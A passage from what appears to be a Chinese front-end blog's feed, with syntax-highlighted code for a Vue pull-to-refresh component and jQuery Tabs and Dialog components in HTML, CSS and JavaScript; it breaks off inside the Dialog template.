class="line">        <span class="variable language_">this</span>.<span class="property">moveDistance</span> = touch.<span class="property">clientY</span> - <span class="variable language_">this</span>.<span class="property">startY</span>;</span><br><span class="line">        <span class="comment">//记录滑动的距离，在松手后让他滑啊滑滑回去            </span></span><br><span class="line">        <span class="keyword">if</span> (_move &gt; <span class="number">50</span>) &#123;</span><br><span class="line">          <span class="comment">//拉到一定程度再下拉刷新，防止误操作                </span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">tipText</span> = <span class="string">&#x27;松开即可刷新&#x27;</span><span class="comment">//上面有了            </span></span><br><span class="line">          &#125;        </span><br><span class="line">      &#125;    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">refreshTouchEnd</span>(<span class="params"></span>) &#123;    </span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;bottomShowTrue&#x27;</span>);</span><br><span class="line">  <span class="comment">//松开后底部就biu的出现啦    </span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">bottomFlag</span>) &#123;</span><br><span class="line">    <span class="comment">//若符合上拉加载的条件，则直接进行数据更新        </span></span><br><span class="line">    <span class="variable language_">this</span>.$emit(<span class="string">&#x27;loadBottom&#x27;</span>);    </span><br><span class="line">  &#125;    </span><br><span class="line">  <span class="keyword">let</span> that = <span class="variable language_">this</span>;    </span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">moveDistance</span> &gt; <span class="number">50</span>) &#123;</span><br><span class="line">    <span class="comment">//拉了一定距离才触发加载动作        </span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">tipText</span> = <span class="string">&#x27;数据加载中...&#x27;</span>;        </span><br><span class="line">    <span class="keyword">let</span> timer = <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;            </span><br><span class="line">      that.<span class="property">el</span>.<span class="property">style</span>.<span class="property">marginTop</span> = that.<span class="property">el</span>.<span class="property">style</span>.<span class="property">marginTop</span>.<span class="title function_">split</span>(<span class="string">&#x27;px&#x27;</span>)[<span class="number">0</span>] - <span class="number">5</span> + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">      <span class="comment">//如果拉的很长，一次性弹回去影响用户体验，所以先让他弹到50的高度，然后再进行数据更新            </span></span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Number</span>(that.<span class="property">el</span>.<span class="property">style</span>.<span class="property">marginTop</span>.<span class="title function_">split</span>(<span class="string">&#x27;px&#x27;</span>)[<span class="number">0</span>]) &lt;= <span class="number">50</span>) &#123;</span><br><span class="line">        <span class="comment">//小于50后就不进行界面变化了，先进行数据更新再变化                </span></span><br><span class="line">        <span class="built_in">clearInterval</span>(timer);                </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;                    </span><br><span class="line">          that.$emit(<span class="string">&#x27;loadTop&#x27;</span>, resolve, reject);</span><br><span class="line">          <span class="comment">//通知父控件，下拉刷新条件满足了，你更新吧                </span></span><br><span class="line">        &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;                  </span><br><span class="line">          that.<span class="title function_">resetBox</span>();                </span><br><span class="line">        &#125;).<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;                  </span><br><span class="line">          that.<span class="title function_">resetBox</span>();</span><br><span class="line">          <span class="comment">//界面恢复（也就是弹回去啦）                </span></span><br><span class="line">        &#125;);           </span><br><span class="line">      &#125;       </span><br><span class="line">    &#125;, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">//通过一个promise，让数据更新结束后再进行界面变化。也可以采用其他的方式，如async await方式   </span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;        </span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">resetBox</span>();    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">resetBox</span>(<span class="params"></span>) &#123;    </span><br><span class="line">  <span class="keyword">let</span> that = <span class="variable language_">this</span>;    </span><br><span class="line">  <span class="comment">//使用定时器的方式，biubiubiu的实现滑动界面刷新的效果。    </span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">moveDistance</span> &gt; <span class="number">0</span>) &#123;        </span><br><span class="line">    <span class="keyword">let</span> timer = <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;            </span><br><span class="line">      that.<span class="property">el</span>.<span class="property">style</span>.<span class="property">marginTop</span> = that.<span class="property">el</span>.<span class="property">style</span>.<span class="property">marginTop</span>.<span class="title function_">split</span>(<span class="string">&#x27;px&#x27;</span>)[<span class="number">0</span>] - <span class="number">1</span> + <span class="string">&#x27;px&#x27;</span>;            </span><br><span class="line">      <span class="keyword">if</span> (<span class="title class_">Number</span>(that.<span class="property">el</span>.<span class="property">style</span>.<span class="property">marginTop</span>.<span class="title function_">split</span>(<span class="string">&#x27;px&#x27;</span>)[<span class="number">0</span>]) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">clearInterval</span>(timer);</span><br><span class="line">        <span class="comment">//这里很重要，不删除，可能看到奇奇怪怪的东西哦 </span></span><br><span class="line">      &#125;       </span><br><span class="line">    &#125;, <span class="number">1</span>)    </span><br><span class="line">  &#125;    </span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">moveDistance</span> = <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h5><p><img src="/Blog/2018/09/07/essay/%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E4%B8%8A%E6%8B%89%E5%8A%A0%E8%BD%BD%EF%BC%8C%E4%B8%8B%E6%8B%89%E5%88%B7%E6%96%B0/index/img.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面向编程----造轮子</title>
      <link href="/Blog/2018/09/06/essay/%E9%9D%A2%E5%90%91%E7%BC%96%E7%A8%8B----%E9%80%A0%E8%BD%AE%E5%AD%90/index/"/>
      <url>/Blog/2018/09/06/essay/%E9%9D%A2%E5%90%91%E7%BC%96%E7%A8%8B----%E9%80%A0%E8%BD%AE%E5%AD%90/index/</url>
      
        <content type="html"><![CDATA[<h4 id="Tags组件-jsbin"><a href="#Tags组件-jsbin" class="headerlink" title="Tags组件(jsbin)"></a><a href="http://js.jirengu.com/qoporeluxi/54/edit?html,js,output">Tags组件(jsbin)</a></h4><h6 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery-2.1.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS Bin<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tabs&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;tab-head&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;tab-body&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>content1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>content2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>content3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tabs&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;tab-head&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;tab-body&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>content1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>content2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>content3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CSS</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*&#123;<span class="attribute">margin</span>:<span class="number">0</span>&#125;</span><br><span class="line"><span class="selector-tag">ul</span>, <span class="selector-tag">li</span> &#123;<span class="attribute">list-style</span>:none&#125;</span><br><span class="line"><span class="selector-class">.tab-head</span> &#123;<span class="attribute">display</span>: flex;&#125;</span><br><span class="line"><span class="selector-class">.tab-head</span> <span class="selector-tag">li</span>&#123;<span class="attribute">border</span>: <span class="number">1px</span> solid transparent; <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">8px</span>; <span class="attribute">cursor</span>: pointer&#125;</span><br><span class="line"><span class="selector-class">.tab-head</span> <span class="selector-tag">li</span><span class="selector-pseudo">:hover</span> &#123;<span class="attribute">border-color</span>: <span class="number">#c03</span>&#125;</span><br><span class="line"><span class="selector-class">.tab-head</span> <span class="selector-tag">li</span><span class="selector-class">.cur</span> &#123;</span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#c03</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.tab-body</span> <span class="selector-tag">li</span> &#123;<span class="attribute">display</span>: none;&#125;</span><br><span class="line"><span class="selector-class">.tab-body</span> <span class="selector-tag">li</span><span class="selector-class">.cur</span> &#123;<span class="attribute">display</span>: block;&#125;</span><br></pre></td></tr></table></figure><p>JS</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">function Tags(selector) &#123;</span><br><span class="line">  this.parentEle = $(selector)</span><br><span class="line">  this.init()</span><br><span class="line">  this.bindEvents()</span><br><span class="line">&#125;</span><br><span class="line">Tags.prototype.init = function () &#123;</span><br><span class="line">  this.parentEle.each( (i,v) =&gt; &#123;</span><br><span class="line">    $(v).find(<span class="string">&#x27;ul&#x27;</span>).e<span class="string">q(0)</span>.find(<span class="string">&#x27;li&#x27;</span>).e<span class="string">q(0)</span>.addClass(<span class="string">&#x27;cur&#x27;</span>)</span><br><span class="line">    $(v).find(<span class="string">&#x27;ul&#x27;</span>).e<span class="string">q(1)</span>.find(<span class="string">&#x27;li&#x27;</span>).e<span class="string">q(0)</span>.addClass(<span class="string">&#x27;cur&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">Tags.prototype.bindEvents = function () &#123;</span><br><span class="line">  this.parentEle.on(<span class="string">&#x27;click&#x27;</span>, <span class="string">&#x27;.tab-head li&#x27;</span>, function(e)&#123;</span><br><span class="line">    $(this).addClass(<span class="string">&#x27;cur&#x27;</span>).siblings().removeClass(<span class="string">&#x27;cur&#x27;</span>)</span><br><span class="line">    $(this).parent().next().find(<span class="string">&#x27;li&#x27;</span>).e<span class="string">q($(this)</span>.index()).addClass(<span class="string">&#x27;cur&#x27;</span>).siblings().removeClass(<span class="string">&#x27;cur&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">// <span class="regexp">//</span> ES6 class写法</span><br><span class="line">// class Tags &#123;</span><br><span class="line"><span class="regexp">//</span>   constructor(selector) &#123;</span><br><span class="line"><span class="regexp">//</span>     this.parentEle = $(selector)</span><br><span class="line">//     this.init()</span><br><span class="line">//     this.bindEvents()</span><br><span class="line">//   &#125;</span><br><span class="line">//   init() &#123;</span><br><span class="line"><span class="regexp">//</span>     this.parentEle.each( (i,v) =&gt; &#123;</span><br><span class="line"><span class="regexp">//</span>       $(v).find(<span class="string">&#x27;ul&#x27;</span>).e<span class="string">q(0)</span>.find(<span class="string">&#x27;li&#x27;</span>).e<span class="string">q(0)</span>.addClass(<span class="string">&#x27;cur&#x27;</span>)</span><br><span class="line">//       $(v).find(<span class="string">&#x27;ul&#x27;</span>).e<span class="string">q(1)</span>.find(<span class="string">&#x27;li&#x27;</span>).e<span class="string">q(0)</span>.addClass(<span class="string">&#x27;cur&#x27;</span>)</span><br><span class="line">//     &#125;)</span><br><span class="line">//   &#125;</span><br><span class="line">//   bindEvents() &#123;</span><br><span class="line"><span class="regexp">//</span>     this.parentEle.on(<span class="string">&#x27;click&#x27;</span>, <span class="string">&#x27;.tab-head li&#x27;</span>, function(e)&#123;</span><br><span class="line"><span class="regexp">//</span>       $(this).addClass(<span class="string">&#x27;cur&#x27;</span>).siblings().removeClass(<span class="string">&#x27;cur&#x27;</span>)</span><br><span class="line">//       $(this).parent().next().find(<span class="string">&#x27;li&#x27;</span>).e<span class="string">q($(this)</span>.index()).addClass(<span class="string">&#x27;cur&#x27;</span>).siblings().removeClass(<span class="string">&#x27;cur&#x27;</span>)</span><br><span class="line">//     &#125;)</span><br><span class="line">//   &#125;</span><br><span class="line">// &#125;</span><br><span class="line"></span><br><span class="line">var tabs = new Tags(<span class="string">&#x27;.tabs&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="Dialog组件-jsbin"><a href="#Dialog组件-jsbin" class="headerlink" title="Dialog组件(jsbin)"></a><a href="http://js.jirengu.com/gipelipuse/76/edit?js,output">Dialog组件(jsbin)</a></h4><h6 id="HTML-1"><a href="#HTML-1" class="headerlink" title="HTML"></a>HTML</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery-2.1.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS Bin<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;a1&quot;</span>&gt;</span>111<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;a2&quot;</span>&gt;</span>222<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CSS</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">* &#123;<span class="attribute">margin</span>:<span class="number">0</span>;<span class="attribute">padding</span>:<span class="number">0</span>;&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-mask</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.3</span>);</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#fff</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">1px</span> <span class="number">1px</span> <span class="number">1px</span> <span class="number">1px</span> <span class="built_in">rgab</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-head</span> &#123;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#333</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-body</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">15px</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">min-height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">  <span class="attribute">word-break</span>: break-all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-wrap</span>&gt;<span class="selector-tag">span</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-button-alert</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-button-confirm</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-button</span>&gt;<span class="selector-tag">button</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffffff</span>;</span><br><span class="line">  <span class="attribute">outline</span>: none;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-button</span>&gt;<span class="selector-class">.zc-dialog-confirm</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#6cb5f4</span>;</span><br><span class="line">  <span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#54a9f2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-button</span>&gt;<span class="selector-class">.zc-dialog-confirm</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#3d9df0</span>;</span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#1b8cee</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-button</span>&gt;<span class="selector-class">.zc-dialog-cancel</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#d9534f</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#d43f3a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.zc-dialog-button</span>&gt;<span class="selector-class">.zc-dialog-cancel</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#c9302c</span>;</span><br><span class="line">  <span class="attribute">border-color</span>: <span class="number">#ac2925</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JS</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Dialog() &#123;</span><br><span class="line">//   this.<span class="keyword">option</span> = <span class="keyword">option</span></span><br><span class="line">  this.bindEvent()</span><br><span class="line">&#125;</span><br><span class="line">Dialog.prototype.template = <span class="keyword">function</span> (<span class="keyword">option</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> temp = `<span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;zc-dialog-mask&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                </span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;zc-dialog-wrap&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  </span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;zc-dialog-head&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    $</span><span class="language-xquery">&#123;<span class="keyword">option</span>.title || <span class="string">&#x27;提示&#x27;</span>&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">                  </span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;zc-dialog-body&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    $</span><span class="language-xquery">&#123;<span class="keyword">option</span>.content || <span class="keyword">option</span> || <span class="string">&#x27;内容&#x27;</span>&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">                  </span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;zc-dialog-button&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">                  </span><span class="language-xml"><span 